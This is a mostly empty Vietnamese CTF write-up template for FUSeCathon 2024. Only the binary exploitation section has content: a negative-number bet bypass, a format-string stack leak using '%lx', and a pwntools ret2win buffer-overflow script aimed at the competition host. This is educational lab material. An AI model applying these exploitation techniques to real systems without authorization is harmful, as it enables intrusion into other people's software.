---
title: "Write up FUSeCathon 2024"
---

# Introduction

This is the write-up for the FUSeCathon 2024.

# Reverse Engineering
---
## RE1

<write here>

---
## RE2

<write here>

---

## RE3

<write here>

---

## MiniSteg

<write here>

---

## Horrible childhood memories

<write here>

---

## Nothing there

<write here>

---

## mov

<write here>

---

# Cryptography

---

## CRYPTO

<write here>

---

## Passio

<write here>

---

# Web

---

## IsH0wSp33d

<write here>

---

## web-secu-challenge

<write here>

---

## wsproblem

<write here>

---

## donottrust

<write here>

---

## Checkpoint

<write here>

---

## save-the-changes

<write here>

---

## Hells-Lab

<write here>

---

## Kotlin App

<write here>

---

## web-the-mindfullness-inside

---

# Binary Exploitation

---

## cards

![image](https://hackmd.io/_uploads/ByDR6xKXA.png) <br>
![image](https://hackmd.io/_uploads/Hyu_5S_Q0.png) <br>
![image](https://hackmd.io/_uploads/BkrK9rumR.png) <br>
![image](https://hackmd.io/_uploads/SJHvqrdXC.png) <br>
![image](https://hackmd.io/_uploads/S1ASnHOmA.png) <br>

Ở đây hàm `get_int` được sử dụng khá nhiều để lấy số input, rồi sử dụng `atoi` để chuyển input thành int. Tuy nhiên khi nhập số tiền vào thì nó chỉ check `if ( v4 * v3 > current_gold )` nghĩa là số tiền của mình có lớn hơn số tiền hiện tại không, chứ không check số tiền đầu vào có **âm** không -> `integer overflow`. <br>
![image](https://hackmd.io/_uploads/SJDUTSdX0.png)
Vậy nên ta đơn giản chỉ cần input số âm vào và chơi thua là có tiền :flushed: <br>
![image](https://hackmd.io/_uploads/HyJVCBuQC.png)

---

## pwn-challenge

![image](https://hackmd.io/_uploads/HkiZAltXR.png) <br>

Bài này là dạng blackbox, ta phải exploit mà không có source. Hint là buffer overflow nhưng lỗi ở đây lại là format string :angry: 
Ta đơn giản chỉ cần input một loạt `%lx` vào để lấy data từ stack <br>
![image](https://hackmd.io/_uploads/Syt4ybFmA.png) <br>
![image](https://hackmd.io/_uploads/rkdS1btXA.png) <br>

---

## pwnme
![image](https://hackmd.io/_uploads/SklwybtXC.png) <br>
![image](https://hackmd.io/_uploads/S1CYkWKQR.png) <br>

Nhìn qua thì nó chỉ là buffer overflow ret2win đơn giản, ta chỉ cần tìm offet của `ret` và cho địa chỉ hàm `hacked()` vào. <br>

![image](https://hackmd.io/_uploads/rk8ZgbK7C.png) <br>
```python
#!/usr/bin/python3

from pwn import *

exe = ELF('pwn_1', checksec=False)
libc = exe.libc
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('challenge.fuctf.com', 8001)
else:
    p = process(exe.path)
# GDB()

payload = b'A'*24 + p64(exe.sym.hacked + 1)
sla(b'Name:\n', payload)

p.interactive()

```
Sau khi chương trình nhày vào hàm `hacked`,lúc `push rbp` thì do stack ko chia hết cho 16 nên sẽ bị sigsegv ở `$xmm1` nên ta sẽ nhảy vào địa chỉ hàm đó + 1. <br>
![image](https://hackmd.io/_uploads/SJA4GZFQ0.png)

---

## brain@#(S

<write here>

---

# Forensics
---
## Database Attack Analyzing

<write here>

---

## Basic Steganography

<write here>

---

## No suspicious

<write here>

---

## Ransomware recovery

<write here>

---

# Miscillaneous

---

## FIA love regex

<write here>

---
